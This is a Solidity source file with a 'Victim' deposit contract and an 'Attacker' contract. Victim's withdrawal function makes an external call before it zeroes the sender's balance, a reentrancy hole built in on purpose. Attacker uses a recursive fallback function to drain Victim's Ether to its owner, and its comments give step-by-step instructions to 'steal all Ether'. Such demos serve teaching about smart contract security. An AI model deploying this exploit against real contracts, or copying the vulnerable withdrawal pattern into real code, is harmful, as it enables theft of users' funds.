pragma solidity ^0.4.16;

import "https://github.com/OpenZeppelin/zeppelin-solidity/contracts/ownership/Ownable.sol";

contract Victim {
    mapping (address => uint) public funds;
    event Deposit(address deposit, uint amount);
    event Withdrawal(address withdrawal, uint amount);
    
    function deposit() payable {
        funds[msg.sender] += msg.value;
        Deposit(msg.sender, msg.value);
    }
    
    function withdrawal() {
        msg.sender.call.value(funds[msg.sender])();
        Withdrawal(msg.sender, funds[msg.sender]);
        funds[msg.sender] = 0;   
    }
    
    function getBalance() constant returns (uint) {
        return this.balance;
    }
}

contract Attacker is Ownable {
    Victim public victim;
    
    function Attacker(Victim victimAddress) {
        victim = victimAddress;
    }
    
    function depositVictim() payable {
        victim.deposit.value(msg.value)();
    }
    
    // 1. Call Victim.deposit() from another account (this is what will be stolen)
    // 2. Call Attacker.depositVictim() first with some amount of Ether
    //    The greater the deposit amount, the less recursive calls needed and the lower the gas cost
    //    The lower the deposit amount the closer to the total of the victim that you can steal
    // 3. Call Attacker.() (fallback function) with a large amount of gas to attack Victicm and steal all Ether
    function () payable {
        if (msg.gas > 50000 && victim.balance >= victim.funds(this) && victim.funds(this) > 0) {
            victim.withdrawal();
        }
        else {
            owner.transfer(this.balance);
        }
    }
    
    function getBalance() constant returns (uint) {
        return this.balance;
    }
}
